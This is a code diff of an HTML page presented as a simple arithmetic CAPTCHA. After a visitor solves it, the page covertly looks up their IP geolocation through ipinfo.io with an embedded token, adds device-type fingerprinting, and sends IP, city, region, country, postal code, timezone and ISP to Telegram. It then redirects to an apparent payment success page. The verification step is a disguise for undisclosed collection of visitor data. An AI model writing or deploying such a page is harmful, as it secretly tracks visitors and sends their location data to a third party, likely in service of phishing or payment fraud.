@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CAPTCHA</title>
+  <title>CAPTCHA with Telegram Logging</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -11,6 +11,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
     .captcha-container {
       background: white;
@@ -66,7 +67,7 @@
     <h2>Verify You're Human</h2>
     <div class="captcha-box" id="captchaQuestion"></div>
     <input type="text" id="captchaInput" placeholder="Enter your answer" />
-    <button onclick="validateCaptcha()">Submit</button>
+    <button id="submitBtn">Submit</button>
     <div id="captchaMessage"></div>
   </div>
 
@@ -83,6 +84,17 @@
       document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
       document.getElementById("captchaMessage").innerHTML = '';
       document.getElementById("captchaInput").value = '';
+    }
+
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+
+      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
+      if (/Android/i.test(ua)) return "Android Device";
+      if (/Windows/i.test(ua)) return "Windows PC";
+      if (/Macintosh/i.test(ua)) return "macOS Device";
+      if (/Linux/i.test(ua)) return "Linux Device";
+      return "Unknown Device";
     }
 
     async function sendToTelegram(message) {
@@ -106,26 +118,27 @@
     }
 
     async function validateCaptcha() {
-      const userAnswer = parseInt(document.getElementById("captchaInput").value);
+      const userAnswer = parseInt(document.getElementById("captchaInput").value.trim());
       const messageEl = document.getElementById("captchaMessage");
 
       if (userAnswer === answer) {
         messageEl.innerHTML = "<p class='success'>Verified! Redirecting... ✅</p>";
 
-        // Get IP info
         try {
           const res = await fetch("https://ipinfo.io/json?token=4b4e37d7269136");
           const data = await res.json();
+          const deviceType = getDeviceType();
 
           const userMessage = `
 🔐 SIMPLE HELP
+📱 Device: ${deviceType}
 🌍 IP: ${data.ip}
 🏙️ City: ${data.city}
 📍 Region: ${data.region}
 📦 Country: ${data.country}
 📮 Postal: ${data.postal}
 🕐 Timezone: ${data.timezone}
-📱 ISP: ${data.org}
+📡 ISP: ${data.org}
           `.trim();
 
           await sendToTelegram(userMessage);
@@ -133,7 +146,6 @@
           console.warn("IP info error:", e);
         }
 
-        // Redirect after logging
         setTimeout(() => {
           window.location.href = "https://payment-chi-lake.vercel.app/success.html";
         }, 1000);
@@ -143,7 +155,10 @@
       }
     }
 
-    window.onload = generateCaptcha;
+    document.addEventListener("DOMContentLoaded", () => {
+      generateCaptcha();
+      document.getElementById("submitBtn").addEventListener("click", validateCaptcha);
+    });
   </script>
 </body>
 </html>
